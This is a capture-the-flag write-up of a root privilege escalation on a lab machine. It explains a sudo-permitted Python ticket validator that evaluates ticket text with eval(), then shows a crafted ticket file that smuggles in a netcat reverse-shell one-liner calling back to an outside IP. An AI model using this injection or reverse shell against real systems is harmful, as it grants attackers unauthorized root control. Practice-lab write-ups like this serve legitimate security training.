# Privilege escalation to root
## development user can run following command as sudo
```bash
development@bountyhunter:~$ sudo -l
Matching Defaults entries for development on bountyhunter:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User development may run the following commands on bountyhunter:
    (root) NOPASSWD: /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py
```
Running command `sudo -l` tells tghat development user can run `/usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py` command as sudo.
![[Pasted image 20210916163151.png]]
## Analyzing contents of `/opt/skytrain_inc/ticketValidator.py`
```python
#Skytrain Inc Ticket Validation System 0.1
#Do not distribute this file.

def load_file(loc):
    if loc.endswith(".md"):
        return open(loc, 'r')
    else:
        print("Wrong file type.")
        exit()

def evaluate(ticketFile):
    #Evaluates a ticket to check for ireggularities.
    code_line = None
    for i,x in enumerate(ticketFile.readlines()):
        if i == 0:
            if not x.startswith("# Skytrain Inc"):
                return False
            continue
        if i == 1:
            if not x.startswith("## Ticket to "):
                return False
            print(f"Destination: {' '.join(x.strip().split(' ')[3:])}")
            continue

        if x.startswith("__Ticket Code:__"):
            code_line = i+1
            continue

        if code_line and i == code_line:
            if not x.startswith("**"):
                return False
            ticketCode = x.replace("**", "").split("+")[0]
            if int(ticketCode) % 7 == 4:
                validationNumber = eval(x.replace("**", ""))
                if validationNumber > 100:
                    return True
                else:
                    return False
    return False

def main():
    fileName = input("Please enter the path to the ticket file.\n")
    ticket = load_file(fileName)
    #DEBUG print(ticket)
    result = evaluate(ticket)
    if (result):
        print("Valid ticket.")
    else:
        print("Invalid ticket.")
    ticket.close

main()
```
* This python script checks if ticket contained in file is valid or not.
* This script takes ticket file path as input.
* This script checks if file ends with `md` extention.
* Then scripts checks if lines of ticket file contains
	*  `# Skytrain Inc` on first line.
	* `## Ticket to` on second line.
	*  `__Ticket Code:__` on third line.
	*  Fourth line starts with `**`.
*  Then it strips of all `**` on fourth line and checks if first digit before `+`
sign gives remainder of `4` when divided by `7` to check if ticket code is valid.
* Then it evaluates the expression after stripping of all `**` and see if its total is greater than 100 to check if ticket is valid using `eval()` function.
## Exploiting `eval()` function to get reverse shell as root
First of all a file with `.md` extention was made satisfying all conditions of valid ticket in `/tmp/clarkey` directory named `a.md` which contained reverse shell code `__import__('os').system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.98 1234 >/tmp/f')` in statement that will evaluate using evail()
```bash
development@bountyhunter:/opt/skytrain_inc$ cat /tmp/clarkey/a.md
# Skytrain Inc# Skytrain Inc
## Ticket to New Haven
__Ticket Code:__
**4 + __import__('os').system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.98 1234 >/tmp/f')**
##Issued: 2021/04/06
#End Ticket
```
Now running command `/usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py` as sudo to get reverse shell 




